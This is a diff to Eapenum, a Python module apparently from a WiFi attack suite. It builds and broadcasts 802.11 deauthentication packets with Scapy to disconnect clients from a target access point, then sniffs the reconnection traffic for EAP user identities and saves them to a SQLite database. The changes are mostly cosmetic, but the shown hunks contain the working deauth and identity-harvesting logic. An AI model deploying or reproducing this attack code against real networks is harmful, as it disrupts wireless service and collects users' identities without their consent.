@@ -3,7 +3,7 @@
 # The Eapenum module will perform a deauthentication attack against a single access point/BSSID,
 # while client probes attempt to reconnect Eapenum will sniff insecure EAP user identities.
 # Author(s): Nick Sanzotta / Bill Harshbarger
-# Version: v 1.05162017
+# Version: v 1.09072017
 
 try:
 	import os, sys, threading
@@ -12,15 +12,9 @@ try:
 except Exception as e:
 	print('\n [!] ERROR: ' + str(e))
 	sys.exit(1)
-
-# Database
-from dbcommands import DB
-# Database connection
-# CHECK: needs to be relocated, used while testing database.py
-import sqlite3
 try:
-     # Connect to Database 
-     # ISSUE/TEMP hardcoded db_path
+     from dbcommands import DB
+     import sqlite3
      conn = sqlite3.connect('data/WiFiSuite.db', check_same_thread=False) # KEEP Thread Support
      conn.text_factory = str # KEEP Interpret 8-bit bytestrings 
      conn.isolation_level = None # KEEP Autocommit Mode
@@ -31,8 +25,6 @@ except Exception as e:
 
 # Do not move into class
 identities = set()
-
-# CHECK if this is needed still?
 bssid = set()
 
 class eapEnum(threading.Thread):
@@ -52,6 +44,9 @@ class eapEnum(threading.Thread):
 		self.deauthPacket = RadioTap()/Dot11(type=0,subtype=12,addr1=self.broadcastMac,addr2 = self.apmac, addr3 = self.apmac)/Dot11Deauth(reason=7)
 		self.wirelessInt = str(self.interface.get_ifname())
 		
+	def run(self):
+		self.sniff_identities()
+		# TO DO: Add to Queue and end thread
 
 	def monitor_start(self):
 		os.system('ifconfig ' + self.wirelessInt + ' down')
@@ -73,7 +68,7 @@ class eapEnum(threading.Thread):
 		return
 
 	def deauth(self):
-		print(blue('i') + '%s is sending %s deauthentication packets to %s' % (self.wirelessInt, self.deauthPktCount, self.apmac))
+		print(normal('*') + '%s is sending %s deauthentication packets to %s' % (self.wirelessInt, self.deauthPktCount, self.apmac))
 		# Building packet: addr1 is target (all FF, addr2/3 are the target AP, can be pulled from db)
 		for i in range(self.deauthPktCount):
 			self.deauthPacket = RadioTap()/Dot11(type=0,subtype=12,addr1=self.broadcastMac,addr2 = self.apmac, addr3 = self.apmac)/Dot11Deauth(reason=7)
@@ -98,26 +93,18 @@ class eapEnum(threading.Thread):
 				# Append to set: identities
 				identities.add(identity)
 				# STDOUT
-				print(identity)
+				print(green('*')+'%s' % (identity))
 				# Commit to database
 				db.identity_commit(identity, essid)
 
 	def sniff_identities(self):
 		self.monitor_start()
-		# time.sleep(.5) # CHECK: probably can be removed, used while testing
 		cls()
 		banner()
 		self.deauth()
-		print(blue('i') + 'Interface locked on channel: ' + str(self.channel))
-		print(blue('i') + 'Sniffing on %s for the next %s seconds.' % (self.wirelessInt,str(self.timeout)))
-		print(green('*') + 'Capturing identities: ')
+		print(normal('*') + 'Interface locked on channel: ' + str(self.channel))
+		print(normal('*') + 'Sniffing on %s for the next %s seconds.' % (self.wirelessInt,str(self.timeout)))
+		print(blue('*') + 'Identities will be listed below and saved to database: (Press Ctrl-Z to quit)\n ')
 		sniff(iface=self.wirelessInt, timeout=self.timeout, prn=self.packethandler, count=0)
 		print(blue('i') + str(self.timeout) + ' seconds has exceeded: ')
-		# time.sleep(.5) # CHECK: probably can be removed, used while testing
 		self.monitor_stop()
-
-	def run(self):
-		# Database check
-		# createdb.dbcheck() # CHECK: can probably be removed will add to sanity check script
-		self.sniff_identities()
-		# TO DO: Add to Queue and end thread
